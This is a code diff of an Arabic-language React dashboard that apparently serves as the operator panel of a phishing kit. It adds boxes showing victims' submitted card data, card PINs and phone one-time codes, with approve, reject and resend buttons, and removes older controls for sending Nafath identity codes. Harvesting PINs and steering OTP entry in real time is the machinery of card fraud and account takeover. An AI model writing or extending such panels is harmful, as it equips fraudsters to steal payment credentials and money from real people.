@@ -335,34 +335,52 @@ export default function DashboardPage() {
     return raw?._v5Status || "";
   };
 
-  // Render action buttons based on current page
-  const renderActionButtons = () => {
+  const getPinStatus = (): string => {
+    const raw = selectedRequest?.raw;
+    return raw?._v6Status || "";
+  };
+
+  // Render card verification status box
+  const renderCardVerificationBox = () => {
     const currentPage = getCurrentPage();
     const paymentStatus = getPaymentStatus();
-    const otpStatus = getOtpStatus();
+    const raw = selectedRequest?.raw;
 
-    // Show payment status message ONLY if approved or rejected (not pending)
-    if (currentPage === "check" && (paymentStatus === "approved" || paymentStatus === "rejected")) {
-      return (
-        <div style={{ background: paymentStatus === "approved" ? "#dcfce7" : "#fee2e2", borderRadius: 12, padding: 16, border: `1px solid ${paymentStatus === "approved" ? "#86efac" : "#fca5a5"}`, marginBottom: 16 }}>
-          <h3 style={{ margin: "0 0 8px", fontSize: "0.9rem", fontWeight: 700, color: paymentStatus === "approved" ? "#166534" : "#991b1b" }}>
-            {paymentStatus === "approved" ? "✅ تم الموافقة على الدفع" : "❌ تم رفض الدفع"}
-          </h3>
-          <p style={{ margin: 0, fontSize: "0.85rem", color: paymentStatus === "approved" ? "#15803d" : "#dc2626" }}>
-            {paymentStatus === "approved" ? "العميل يتم توجيهه للخطوة التالية" : "العميل يجب أن يعيد إدخال بيانات الدفع"}
-          </p>
-        </div>
-      );
+    // Only show this box if card data exists
+    if (!raw?._v1 && !raw?.cardNumber) {
+      return null;
     }
 
-    // Show pending status with buttons if currentPage is "check"
-    if (currentPage === "check") {
-      return (
-        <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 16 }}>
-          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12 }}>
-            <span style={{ fontSize: "1rem" }}>⏳</span>
-            <span style={{ fontSize: "0.9rem", fontWeight: 600, color: "#92400e" }}>بانتظار المراجعة</span>
+    return (
+      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
+        <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
+          🔐 صندوق التحقق من البطاقة
+        </h3>
+        
+        {/* Status message */}
+        {paymentStatus === "approved" && (
+          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ تم الموافقة على البطاقة</p>
           </div>
+        )}
+        {paymentStatus === "rejected" && (
+          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ تم رفض البطاقة</p>
+          </div>
+        )}
+        {paymentStatus === "pending" && currentPage === "check" && (
+          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار مراجعة البطاقة</p>
+          </div>
+        )}
+        {paymentStatus === "verifying" && currentPage === "check" && (
+          <div style={{ background: "#dbeafe", borderRadius: 8, padding: 12, border: "1px solid #93c5fd", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#1e40af", fontWeight: 600 }}>🔄 جاري التحقق من البطاقة</p>
+          </div>
+        )}
+        
+        {/* Action buttons - show only when pending or verifying */}
+        {(paymentStatus === "pending" || paymentStatus === "verifying" || !paymentStatus) && currentPage === "check" && (
           <div style={{ display: "flex", gap: 8 }}>
             <button
               onClick={() => handlePaymentAction("approved")}
@@ -387,25 +405,83 @@ export default function DashboardPage() {
               {actionLoading === "payment" ? "جاري..." : "❌ مرفوض"}
             </button>
           </div>
-        </div>
-      );
+        )}
+      </div>
+    );
+  };
+
+  // Render PIN status box
+  const renderPinBox = () => {
+    const pinStatus = getPinStatus();
+    const raw = selectedRequest?.raw;
+
+    // Only show this box if PIN data exists
+    if (!raw?._v6 && !raw?.pinCode) {
+      return null;
     }
 
-    // Show OTP status if already decided
-    if ((currentPage === "veri" || currentPage === "step2") && otpStatus) {
-      return (
-        <div style={{ background: otpStatus === "approved" ? "#dcfce7" : "#fee2e2", borderRadius: 12, padding: 16, border: `1px solid ${otpStatus === "approved" ? "#86efac" : "#fca5a5"}`, marginBottom: 16 }}>
-          <h3 style={{ margin: "0 0 8px", fontSize: "0.9rem", fontWeight: 700, color: otpStatus === "approved" ? "#166534" : "#991b1b" }}>
-            {otpStatus === "approved" ? "✅ تم الموافقة على رمز التحقق" : "❌ تم رفض رمز التحقق"}
-          </h3>
-        </div>
-      );
+    return (
+      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
+        <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
+          🔑 صندوق رمز PIN
+        </h3>
+        
+        {/* Status message */}
+        {pinStatus === "approved" && (
+          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ تم إدخال رمز PIN</p>
+          </div>
+        )}
+        {pinStatus === "pending" && (
+          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار إدخال رمز PIN</p>
+          </div>
+        )}
+        {pinStatus === "rejected" && (
+          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ تم رفض رمز PIN</p>
+          </div>
+        )}
+      </div>
+    );
+  };
+
+  // Render phone OTP verification box
+  const renderPhoneOtpBox = () => {
+    const otpStatus = getOtpStatus();
+    const raw = selectedRequest?.raw;
+    const currentPage = getCurrentPage();
+
+    // Only show this box if phone data exists
+    if (!raw?.phoneNumber && !raw?._v5 && !raw?.otpCode) {
+      return null;
     }
 
-    if (currentPage === "veri" || currentPage === "step2") {
-      return (
-        <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 16 }}>
-          <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>إجراءات رمز التحقق (OTP)</h3>
+    return (
+      <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 12 }}>
+        <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>
+          📱 صندوق رمز تحقق الهاتف
+        </h3>
+        
+        {/* Status message */}
+        {otpStatus === "approved" && (
+          <div style={{ background: "#dcfce7", borderRadius: 8, padding: 12, border: "1px solid #86efac", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#166534", fontWeight: 600 }}>✅ تم الموافقة على رمز الهاتف</p>
+          </div>
+        )}
+        {otpStatus === "rejected" && (
+          <div style={{ background: "#fee2e2", borderRadius: 8, padding: 12, border: "1px solid #fca5a5", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ تم رفض رمز الهاتف</p>
+          </div>
+        )}
+        {(otpStatus === "pending" || otpStatus === "verifying") && (currentPage === "veri" || currentPage === "step2" || currentPage === "phone" || currentPage === "step5") && (
+          <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
+            <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار مراجعة رمز الهاتف</p>
+          </div>
+        )}
+        
+        {/* Action buttons - show only when pending or verifying */}
+        {(otpStatus === "pending" || otpStatus === "verifying" || !otpStatus) && (currentPage === "veri" || currentPage === "step2" || currentPage === "phone" || currentPage === "step5") && (
           <div style={{ display: "flex", gap: 8 }}>
             <button onClick={() => handleOtpAction("approved")} disabled={actionLoading === "otp"}
               style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700 }}>
@@ -420,71 +496,21 @@ export default function DashboardPage() {
               🔄 إعادة إرسال
             </button>
           </div>
-        </div>
-      );
-    }
+        )}
+      </div>
+    );
+  };
 
-    if (currentPage === "confi" || currentPage === "step3") {
-      return (
-        <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 16 }}>
-          <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>إرسال رمز PIN</h3>
-          <div style={{ display: "flex", gap: 8 }}>
-            <input
-              type="text" placeholder="أدخل رمز PIN..." value={pinInput}
-              onChange={(e) => setPinInput(e.target.value)} maxLength={4}
-              style={{ flex: 1, padding: "10px 12px", border: "1px solid #e5e7eb", borderRadius: 8, fontSize: "1rem", textAlign: "center" }}
-            />
-            <button onClick={handleSendPin} disabled={actionLoading === "pin" || !pinInput}
-              style={{ padding: "10px 20px", border: "none", borderRadius: 8, background: "#2563eb", color: "#fff", fontWeight: 700 }}>
-              {actionLoading === "pin" ? "جاري..." : "📤 إرسال"}
-            </button>
-          </div>
-        </div>
-      );
-    }
-
-    if (currentPage === "phone" || currentPage === "step5") {
-      return (
-        <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 16 }}>
-          <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>إجراءات التحقق من الهاتف</h3>
-          <div style={{ display: "flex", gap: 8 }}>
-            <button onClick={() => handlePhoneAction("approved")} disabled={actionLoading === "phone"}
-              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#22c55e", color: "#fff", fontWeight: 700 }}>
-              ✅ موافق
-            </button>
-            <button onClick={() => handlePhoneAction("rejected")} disabled={actionLoading === "phone"}
-              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#ef4444", color: "#fff", fontWeight: 700 }}>
-              ❌ مرفوض
-            </button>
-            <button onClick={() => handlePhoneAction("resend")} disabled={actionLoading === "phone"}
-              style={{ flex: 1, padding: "10px 16px", border: "none", borderRadius: 8, background: "#f59e0b", color: "#fff", fontWeight: 700 }}>
-              🔄 إعادة إرسال
-            </button>
-          </div>
-        </div>
-      );
-    }
-
-    if (currentPage === "nafad" || currentPage === "step4") {
-      return (
-        <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb", marginBottom: 16 }}>
-          <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>إرسال رمز النفاذ (00)</h3>
-          <div style={{ display: "flex", gap: 8 }}>
-            <input
-              type="text" placeholder="أدخل رمز النفاذ..." value={nafadInput}
-              onChange={(e) => setNafadInput(e.target.value)}
-              style={{ flex: 1, padding: "10px 12px", border: "1px solid #e5e7eb", borderRadius: 8, fontSize: "1rem", textAlign: "center" }}
-            />
-            <button onClick={handleSendNafadCode} disabled={actionLoading === "nafad" || !nafadInput}
-              style={{ padding: "10px 20px", border: "none", borderRadius: 8, background: "#9333ea", color: "#fff", fontWeight: 700 }}>
-              {actionLoading === "nafad" ? "جاري..." : "📤 إرسال"}
-            </button>
-          </div>
-        </div>
-      );
-    }
-
-    return null;
+  // Render action buttons based on current page
+  const renderActionButtons = () => {
+    // Render all three boxes independently (each shows/hides based on data availability)
+    return (
+      <>
+        {renderCardVerificationBox()}
+        {renderPinBox()}
+        {renderPhoneOtpBox()}
+      </>
+    );
   };
 
   return (
